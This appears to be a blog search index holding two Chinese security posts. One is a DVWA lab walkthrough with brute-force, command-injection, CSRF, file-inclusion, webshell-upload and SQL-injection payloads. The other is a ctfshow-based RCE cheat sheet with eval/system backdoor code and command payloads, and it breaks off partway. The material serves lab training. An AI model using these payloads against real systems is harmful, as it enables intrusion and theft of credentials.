<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DVWA靶场通关</title>
    <link href="/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/"/>
    <url>/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="DVWA靶场通关"><a href="#DVWA靶场通关" class="headerlink" title="DVWA靶场通关"></a>DVWA靶场通关</h1><h2 id="1-暴力破解-brute-force"><a href="#1-暴力破解-brute-force" class="headerlink" title="1.暴力破解 brute force"></a>1.暴力破解 brute force</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><blockquote><p>使用bp抓包，分别在username和password处添加变量，使用集束炸弹（cluster bomb）模式，添加字典进行爆破</p></blockquote><p><img src="/.com//0c1252a336f1a19d4a0c461a2625dfbd-20250425163154-kusite3.png" alt="0c1252a336f1a19d4a0c461a2625dfbd"></p><p><img src="/.com//6a77d729ad1c18c986d038672540d012-20250425164624-cuo7973.png" alt="6a77d729ad1c18c986d038672540d012"></p><p>可以手工SQL注入（万能密码），在用户名框中输入admin’ or ‘1’=‘1，任意输入密码即可登陆（同时在弱口令字典里也有该语句）</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p> 和low相比，过滤了一些转义字符，但依旧可以使用bp爆破方法同low</p><p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc"></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p> 随意输入用户名密码，抓个包可以看到，携带了token</p><p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc-1"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">GET /vulnerabilities/brute/?username=123&amp;password=123&amp;Login=Login&amp;user_token=bd32cb5998988f7c2f041f82f0dd701c HTTP/1.1<br>Host: 69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Connection: close<br>Referer: http://69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81/vulnerabilities/brute/<br>Cookie: PHPSESSID=76shf76ao4uqleikshlanj6eh0; security=high<br>Upgrade-Insecure-Requests: 1<br>Priority: u=0, i<br></code></pre></td></tr></table></figure><blockquote><p>发送到Intruder，攻击类型选择交叉攻击Pitchfork，给password和token添加payload位置</p></blockquote><p><img src="/.com//image-20250425164433-gi0ryza.png" alt="image"></p><p><img src="/.com//image-20250425164358-rpkpeox.png" alt="image"></p><p>然后token选择递归提取，并且把初始可用的token代入</p><p><img src="/.com//image-20250425164754-z5wbyc4.png" alt="image"></p><p><img src="/.com//image-20250425164835-vvz11kl.png" alt="image"></p><p>然后开始攻击即可</p><p>‍</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>网站提示我们输入ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sc">&lt;?php<br><br>if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;<br>    // Get input<br>    $target = $_REQUEST[ &#x27;ip&#x27; ];<br><br>    // Determine OS and execute the ping command.<br>    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;<br>        // Windows<br>        $cmd = shell_exec( &#x27;ping  &#x27; . $target );//函数能执行系统命令<br>    &#125;<br>    else &#123;<br>        // *nix<br>        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );<br>    &#125;<br><br>    // Feedback for the end user<br>    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;<br>&#125;<br><br>?&gt; <br></code></pre></td></tr></table></figure><blockquote><p>这里我们要说一下命令连接符<br>&amp; ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行<br>&amp;&amp;：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行<br>|：前面一个命令无论是否执行，后面的命令都能执行且只执行后面一个<br>||：前面一个命令不能正常执行后，才能执行后面一个命令</p><p>我们使用“|”符号作为连接符让计算机做出除ping以外的操作实现命令注入<br>结果显示注入成功！<br>命令：127.0.0.1 | dir</p></blockquote><p>‍</p><h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p> 直接分析源码看看和Low等级有什么区别<br> 源码分析：发现在Low等级源码的基础上添加了一个黑名单，把‘&amp;&amp;’字符和‘;’字符过滤掉了，但我们可以使用黑名单之外的命令连接符继续命令注入</p><p><img src="/.com//9275c6eed4da2dc9b0c7c1e5e63d563c-20250425170542-d99goej.png" alt="9275c6eed4da2dc9b0c7c1e5e63d563c"></p><p>‍</p><h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p> 源码分析：发现还是一样的套路，也是过滤字符但过滤得更多了。但仔细观察发现有一个过滤是’| ‘，注意这个过滤是加了空格的，说明这个过滤其实是没用的，只需要’|’后面直接加入参数，不保留空格，我们依然可以用这个命令连接符进行命令注入</p><p><img src="/.com//a24bd3a257d4e129cca8019070a9b07d-20250425170620-rfpguy9.png" alt="a24bd3a257d4e129cca8019070a9b07d"></p><p>‍</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p> 网站的本意是让我们在网站里更改密码</p><p><img src="/.com//1939fdc85c82e1df86c9b1f916522081-20250425171126-xu4wwp5.png" alt="1939fdc85c82e1df86c9b1f916522081"></p><blockquote><p>但是能够主要到当我们更改密码成功后url栏的参数是这样的<br><a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>可以分析出password_new是我输入的密码，password_conf是我确认的密码，说明我们在网站上输入的信息是会在url栏这里进行一个传输执行</p></blockquote><p><img src="/.com//830adffb3898c5c5488d85ee81e8e6a9-20250425171137-dr9bhdv.png" alt="830adffb3898c5c5488d85ee81e8e6a9"></p><p>抓个包看看，发现url栏的信息和请求的信息是一致的</p><p> <img src="/.com//de160531a83b91e4ff84d165b7a7c13a-20250425171147-iksxt52.png" alt="de160531a83b91e4ff84d165b7a7c13a"></p><blockquote><p>那是不是说明如果我能控制url栏里传入的参数，就能够不在网站内执行更改密码的操作呢？<br>更改url的参数：<br><a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&password_conf=456789&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&amp;password_conf=456789&amp;Change=Change#</a><br>只需要在原来的url基础上该新密码和确认密码的参数即可</p><p>为了显示效果，我使当前页面是密码不匹配状态</p></blockquote><p><img src="/.com//c170717135b963832851ab18cdd7291e-20250425171200-nuulqr6.png" alt="c170717135b963832851ab18cdd7291e"></p><p>在新标签内放入设置好的url，点击执行</p><p><img src="/.com//5c64252299acea56a3b35687d997aeb0-20250425171207-xr9kfct.png" alt="5c64252299acea56a3b35687d997aeb0"></p><p>页面跳转到了dvwa的更改密码界面，csrf攻击成功</p><p><img src="/.com//2ada0b8e5e0e9bc04452aa3935526506-20250425171213-9w5xvbr.png" alt="2ada0b8e5e0e9bc04452aa3935526506"></p><blockquote><p>网站的本意是在网站内更改密码，而我通过控制url的传参就能使我能在网站之外执行更改密码的操作，那么当我知道一个网站有csrf漏洞后也可以通过构造url的方式让别人点击执行他意想之外的行为</p><p>源码分析：源码中只对传入的密码和确认密码进行比较，两者一致则执行更改密码命令成功返回Password Change，不一致则返回Passwords did not match，没有任何过滤，所以能轻易执行csrf漏洞</p></blockquote><p><img src="/.com//f0c609415b16d644263608771e005b1a-20250425171252-o8j4acs.png" alt="f0c609415b16d644263608771e005b1a"></p><p>‍</p><h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p> 源码分析：和Low等级比较发现，只有一处改变，即在传入密码和确认密码参数前先进行了一个&#x3D;&#x3D;if语句的判断&#x3D;&#x3D;，判断里面的内容主要是验证这个访问请求是否是从&#x3D;&#x3D;dwva网站&#x3D;&#x3D;本身发起的，若不是就不执行后面的操作</p><p><img src="/.com//9dbaa6761aa3ad43ade255e9fe296b30-20250425171315-yfcd81j.png" alt="9dbaa6761aa3ad43ade255e9fe296b30"></p><p>源码是通过referrer这个字段的参数进行判断的，通常情况下在增加referrer验证时就是网站本身当前页面的ip地址，我们通过抓包看看信息</p><p>首先抓一个包，可以看到这里有referer</p><p><img src="/.com//9cea6507c937a1c9f35fd8b63940524c-20250425171659-wyha15h.png" alt="9cea6507c937a1c9f35fd8b63940524c"></p><p>复制刚才构造好的url，在新页面打开：<a href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change#" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#</a></p><p>抓包，发现没有referer</p><p><img src="/.com//3d4b2706cc958a8f1394de205839b040-20250425171716-w1cnaaw.png" alt="3d4b2706cc958a8f1394de205839b040"></p><p>我们自己在这里加一个referer，随意添加，包含本机就可以例如：127.0.0.1</p><p><img src="/.com//ab872067c571ccab991bbebbbe9c311d-20250425171723-miwfpva.png" alt="ab872067c571ccab991bbebbbe9c311d"></p><p>放包，发现已经成功修改</p><p>‍</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p> 可以看到，设置了token</p><p> 这里我们采用抓包，把包发到重放模块，在row中可以看到新的token</p><p><img src="/.com//4eb20c2a54b3919e475b47dfde22f4ff-20250425171734-p8nrrqi.png" alt="4eb20c2a54b3919e475b47dfde22f4ff"></p><blockquote><p>接下来使用获取到的新token构造链接</p><p><a href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change&user_token=9c36edfc71b135e726adce6603be8651">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&amp;password_conf=666666&amp;Change=Change&amp;user_token=9c36edfc71b135e726adce6603be8651</a></p><p>修改成功</p></blockquote><p>‍</p><h2 id="4-File-inclusion-文件包含"><a href="#4-File-inclusion-文件包含" class="headerlink" title="4.File inclusion 文件包含"></a>4.File inclusion 文件包含</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p> 每次点击都会跳转，所以可以在page=后面添加本地文件路径</p><p><img src="/.com//7386fd3fd2979574a11e49bbf188337a-20250425172020-tcersi4.png" alt="7386fd3fd2979574a11e49bbf188337a"></p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p> 可以通过ip+路径包含文件</p><p><img src="/.com//d28bea7da6e424606062dfb78c2893e1-20250425172030-4kgs98a.png" alt="d28bea7da6e424606062dfb78c2893e1"></p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p><img src="/.com//ea03f7407dc9279a2ed7d860673023f0-20250425172036-kxf2wi3.png" alt="ea03f7407dc9279a2ed7d860673023f0"></p><p>源码限制了page之后的参数是以file开头，所以可以用file函数去构建</p><p> <a href="http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:%5CphpStudy%5CWWW%5CDVWA%5Cfile555.txt" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;E:\phpStudy\WWW\DVWA\file555.txt">http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:\phpStudy\WWW\DVWA\file555.txt</a></p><p><img src="/.com//b94534da3ee8d55a722bd51d644994e6-20250425172043-5fapvh7.png" alt="b94534da3ee8d55a722bd51d644994e6"></p><p>‍</p><h2 id="5-File-upload文件上传"><a href="#5-File-upload文件上传" class="headerlink" title="5.File upload文件上传"></a>5.File upload文件上传</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p><img src="/.com//c92f0ca2659de359b6dda9fdd58d23cd-20250425172053-9ya348y.png" alt="c92f0ca2659de359b6dda9fdd58d23cd"></p><p>可以看到，没有任何限制，所以直接上传一个php后门文件即可</p><p> 直接上传一句话木马，蚁剑链接即可</p><h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><p> 可以看到，靶场对文件类型做了限制，只允许上传png、jpeg，并且检查</p><p><img src="/.com//fd8bc231d15557db234ddd92e2d4a745-20250425172423-br5ll4y.png" alt="fd8bc231d15557db234ddd92e2d4a745"></p><p>burp后台改后缀即可</p><p>‍</p><h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><p> 看源代码可以发现，不仅限制了文件类型，而且限制了大小，不能少于100kb</p><p><img src="/.com//42a6ceb6367ab31ef8b9468d9d5c45fb-20250425172446-hhvsnf6.png" alt="42a6ceb6367ab31ef8b9468d9d5c45fb"></p><p>可以上传一个图片马，打开cmd，输入以下命令：<code>copy post2.php/a + 111.png/b 66.png</code>​</p><p><img src="/.com//549490ef5de7cd680ca26bd8f524f483-20250425172455-32a0xdu.png" alt="549490ef5de7cd680ca26bd8f524f483"></p><p>此时已经上传成功，但不能利用</p><p><img src="/.com//4a84d8fcccf0c77b894d775b47aa45cd-20250425172506-52ttghn.png" alt="4a84d8fcccf0c77b894d775b47aa45cd"></p><p>在命令注入中输入127.0.0.1|| ren C:\phpstudy_pro\WWW\DVWA-master\hackable\uploads\888.png 888.php</p><p><img src="/.com//ccfc7557d167997fdc4dd98f505a1078-20250425172532-dnkw477.png" alt="ccfc7557d167997fdc4dd98f505a1078">此时发现，888.png已经被改名为888.php</p><p>‍</p><h2 id="6-insecure-captcha不安全的验证"><a href="#6-insecure-captcha不安全的验证" class="headerlink" title="6.insecure captcha不安全的验证"></a>6.insecure captcha不安全的验证</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><p> 本关是在第二步做验证，所以把step改为2就可以绕过验证</p><p><img src="/.com//eabf443fe5d55d6af0739e5c7df2e765-20250425172652-x0th1hw.png" alt="eabf443fe5d55d6af0739e5c7df2e765"></p><h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p> 依旧抓包改包</p><p><img src="/.com//3635ebcbdcf767c961b46cda65863f80-20250425172657-5hierei.png" alt="3635ebcbdcf767c961b46cda65863f80"></p><h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><p><img src="/.com//490a93c21a9bd427fe3d29dea67d7efa-20250425172703-77m3kop.png" alt="490a93c21a9bd427fe3d29dea67d7efa"></p><p>让通过验证的情况增加了一种。原先是只有验证码为真才能通过验证，现在新增“或者g-recaptcha-response且HTTP_USER_AGENT为特定内容”通过验证。</p><p> 那直接用Burpsuite修改数据包</p><p><img src="/.com//8601e5ee714e65e6521aaecea77fbe2d-20250425172708-5gq4swo.png" alt="8601e5ee714e65e6521aaecea77fbe2d"></p><p>‍</p><h2 id="7-SQL-injection-sql注入"><a href="#7-SQL-injection-sql注入" class="headerlink" title="7.SQL injection sql注入"></a>7.SQL injection sql注入</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><ol><li>输入1+2，可以看到，并未输出3，所以可以判定是字符型注入</li></ol><p><img src="/.com//91a5a615ee0f8c4b9199dd8788cb79e2-20250425172821-gb4jvax.png" alt="91a5a615ee0f8c4b9199dd8788cb79e2"></p><p>输入如下payload：’1 or 1=1’ ，可以看到有报错，所以一定存在sql注入</p><p><img src="/.com//0ded62d0731c2502d756236e702834a6-20250425172828-2scjktq.png" alt="0ded62d0731c2502d756236e702834a6"></p><p><img src="/.com//4fd521db8e735523d0a818882dce5597-20250425172831-e9o5jfm.png" alt="4fd521db8e735523d0a818882dce5597"></p><p>使用order by判断字段数 1’ order by 2 #</p><p><img src="/.com//a17effc3868eb93c474867f504fe2e02-20250425172838-0nbohx7.png" alt="a17effc3868eb93c474867f504fe2e02"></p><p>1’ order by 3 #</p><p><img src="/.com//3200280212d7dbbf9417cd5f46a177ce-20250425172844-yv8r8qc.png" alt="3200280212d7dbbf9417cd5f46a177ce"></p><p>由此判断，他只有两个字段</p><ol><li>然后使用联合查询 1’ union select 1,2 # 获取回显位置</li></ol><p><img src="/.com//14b5a5a1f63d114e0c22f9649147a3fd-20250425172850-1pa3jj7.png" alt="14b5a5a1f63d114e0c22f9649147a3fd"></p><p>在对应位置获取数据库名 1’ union select database(),2 #</p><p><img src="/.com//5c64dd66f4fed0355fd501f7ce4768e7-20250425172856-izm3bma.png" alt="5c64dd66f4fed0355fd501f7ce4768e7"></p><p>获取数据库所有表名 1’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #</p><p><img src="/.com//60b5183c063b38ef89a35c0f06b11302-20250425172901-19j6jn0.png" alt="60b5183c063b38ef89a35c0f06b11302"></p><pre><code class="hljs">获取users字段名</code></pre><p>1’ union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() #</p><p><img src="/.com//9b28bb76146997ac3c1a0310c70c0290-20250425172911-y5kdd7j.png" alt="9b28bb76146997ac3c1a0310c70c0290"></p><ol><li>获取字段值</li></ol><p> 1’ union select password,user from users #</p><p><img src="/.com//830ea6ebdea4a1cafbd68c3b1fc28c7d-20250425172925-6nzb1g3.png" alt="830ea6ebdea4a1cafbd68c3b1fc28c7d"></p><p>现在已经拿到了用户和密码，但密码是加密的，可使用md5自行解密 <a href="https://cmd5.com/" title="md5在线解密破解,md5解密加密">md5在线解密破解,md5解密加密</a></p><p>‍</p><h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><ol><li>先选中1，抓一个包，然后发到重放模块，用于测试，可以修改参数，数字型注入</li></ol><p> id修改为1+1，出现报错</p><p><img src="/.com//f290b11a4a46c412831d62057faa65c5-20250425173006-w7azyem.png" alt="f290b11a4a46c412831d62057faa65c5"></p><p>使用order by判断字段数</p><p><img src="/.com//f7080fe5b14c527ac83e957fa6f387af-20250425173025-p1mqx8c.png" alt="f7080fe5b14c527ac83e957fa6f387af"></p><p><img src="/.com//7e576d86d507cb5fda0d514b7f339a7c-20250425173028-dvfygd6.png" alt="7e576d86d507cb5fda0d514b7f339a7c"></p><p>输入联合查询语句</p><p><img src="/.com//94c752d33768607b940ba5c088b8454c-20250425173035-pg461k1.png" alt="94c752d33768607b940ba5c088b8454c"></p><p>剩余步骤同上</p><h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><p> 1.输入1’，发现报错</p><p><img src="/.com//c3e7ddd980a483947e4df2376ac0d2ff-20250425173042-zcr3d58.png" alt="c3e7ddd980a483947e4df2376ac0d2ff"></p><p>输入联合查询语句</p><p><img src="/.com//1bfc929320387d76beafeb6597f52f71-20250425173052-250wxuk.png" alt="1bfc929320387d76beafeb6597f52f71"></p><p>按上述步骤进行查询</p><h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p> 限制只能为数字   不存在注入</p><p>‍</p><h2 id="8-SQL-injection（blind）盲注"><a href="#8-SQL-injection（blind）盲注" class="headerlink" title="8.SQL injection（blind）盲注"></a>8.SQL injection（blind）盲注</h2><h3 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h3><ol><li>输入 1’ and 1=1 # 可以看到 正常执行</li></ol><p><img src="/.com//34337217f9b95502cde5e73d522aba79-20250425173105-dwfpfwp.png" alt="34337217f9b95502cde5e73d522aba79"></p><p>猜解开数据库长度1’ and length(database())=x #</p><p><img src="/.com//751149ca4a1557d6985de8d258d2cf01-20250425173119-c3wcxww.png" alt="751149ca4a1557d6985de8d258d2cf01"></p><p><img src="/.com//4b90b927976bd2e18252b41bdb1b5f48-20250425173123-ffmyd3b.png" alt="4b90b927976bd2e18252b41bdb1b5f48"></p><p>用aascii猜解数据库名 1’ and ascii(substr(database(),1,1))=100 # 由此确定，第一位ascii是100，对比ascii表（<a href="http://ascii.wjccx.com/" title="ASCII码对照表-完整ASCII码表-我就查查询">ASCII码对照表-完整ASCII码表-我就查查询</a>）可得 为d</p><p><img src="/.com//43b0bc8b8ca471ba0126fe4f5f6a2a0e-20250425173156-3qawi2b.png" alt="43b0bc8b8ca471ba0126fe4f5f6a2a0e"></p><ol><li>和普通sql注入相同，依次查询库名表名字段名</li></ol><h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><ol><li>随意选择一个数，然后抓包</li></ol><p><img src="/.com//7ac45f64d1403222c82393a5b210906c-20250425173331-kchwbjb.png" alt="7ac45f64d1403222c82393a5b210906c"></p><p>修改参数 1 and length(database())=4 #，根据布尔 盲注判断，，数据库名为4</p><p><img src="/.com//a4553a678f1d6482e5fb8ce9841c3538-20250425173338-wyz18se.png" alt="a4553a678f1d6482e5fb8ce9841c3538"></p><p>下面依旧使用sql语句进行查询，步骤同上</p><p>‍</p><h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><ol><li>1’ and 1=1 # 测试，发现成功执行</li></ol><p><img src="/.com//ca86f4d80df4b3feccbf28e4ccdaf857-20250425173346-utigrlz.png" alt="ca86f4d80df4b3feccbf28e4ccdaf857"></p><p>盲注，测试数据库名长度 1’ and length(database())=4 #</p><p><img src="/.com//31274efc2f2bde6b41b806798e997547-20250425173353-ae59gvt.png" alt="31274efc2f2bde6b41b806798e997547"></p><p>接下来的步骤同上</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DVWA靶场通关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE（远程代码执行漏洞）</title>
    <link href="/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/"/>
    <url>/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RCE（远程代码执行漏洞）"><a href="#RCE（远程代码执行漏洞）" class="headerlink" title="RCE（远程代码执行漏洞）"></a>RCE（远程代码执行漏洞）</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RCE（Remote Code  Execution，远程代码执行）漏洞是指攻击者通过漏洞，能够在目标系统上远程执行任意代码的安全漏洞。这种漏洞通常允许攻击者在受害主机上执行恶意命令，可能导致系统被完全控制，甚至可能被用来执行系统级操作，如删除文件、窃取敏感数据、安装恶意软件等。<br>本文基于ctfshow命令执行部分，整理了RCE常见函数与命令。文章很长，建议配合右下角目录食用。</p><hr><h1 id="一-命令执行函数"><a href="#一-命令执行函数" class="headerlink" title="一. 命令执行函数"></a>一. 命令执行函数</h1><p>以下函数都应当在<code>eval</code>​中执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);   <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    <br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];                <br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);       <br>&#125;<span class="hljs-keyword">else</span>&#123;    <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="1-1-system函数命令执行"><a href="#1-1-system函数命令执行" class="headerlink" title="1.1 system函数命令执行"></a>1.1 system函数命令执行</h2><p>通过system函数执行操作系统的shell命令并输出结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;ls&quot;</span>);<br>?c=system(<span class="hljs-string">&quot;tac flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="1-2-passthru函数命令执行"><a href="#1-2-passthru函数命令执行" class="headerlink" title="1.2 passthru函数命令执行"></a>1.2 passthru函数命令执行</h2><p>​<code>passthru</code>​和<code>system</code>​函数差不多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=passthru(<span class="hljs-string">&quot;tac flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="1-3-echo-反引号命令执行"><a href="#1-3-echo-反引号命令执行" class="headerlink" title="1.3 echo+反引号命令执行"></a>1.3 echo+反引号命令执行</h2><p>用反引号执行shell命令，但是反引号执行完命令不会被输出，所以需要配合echo函数输出结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=echo `ls`;<br>?c=echo `tac flag.php`;<br></code></pre></td></tr></table></figure><h2 id="1-4-shell-exec函数命令执行"><a href="#1-4-shell-exec函数命令执行" class="headerlink" title="1.4 shell_exec函数命令执行"></a>1.4 shell_exec函数命令执行</h2><p>​<code>shell_exec</code>​函数和反引号类似，只执行但不返回，需要配合<code>echo</code>​命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=echo shell_exec(<span class="hljs-string">&quot;tac flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="二-常用命令"><a href="#二-常用命令" class="headerlink" title="二. 常用命令"></a>二. 常用命令</h1><p>以下命令应当在命令执行函数中执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    <br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];    <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);   <br>&#125;<span class="hljs-keyword">else</span>&#123;    <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-0-phpinfo-测试命令执行"><a href="#1-0-phpinfo-测试命令执行" class="headerlink" title="1.0 phpinfo()测试命令执行"></a>1.0 phpinfo()测试命令执行</h2><p>​<code>phpinfo()</code>​命令被广泛应用于是否存在RCE命令执行漏洞的测试，例如检验是否成功写入了一句话木马。更加重要的是，phpinfo中<code>disable_functions</code>​项会提供被禁用的命令，对进一步的漏洞利用具有重大帮助</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=phpinfo();<br></code></pre></td></tr></table></figure><h2 id="1-1-ls命令目录读取"><a href="#1-1-ls命令目录读取" class="headerlink" title="1.1 ls命令目录读取"></a>1.1 ls命令目录读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=ls;<br></code></pre></td></tr></table></figure><h2 id="1-2-cat命令文件读取"><a href="#1-2-cat命令文件读取" class="headerlink" title="1.2 cat命令文件读取"></a>1.2 cat命令文件读取</h2><p>​<code>cat</code>​不会将结果数据到页面上，要看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=cat flag.php<br>?c=/bin/cat flag.php<br></code></pre></td></tr></table></figure><h2 id="1-3-tac命令文件读取"><a 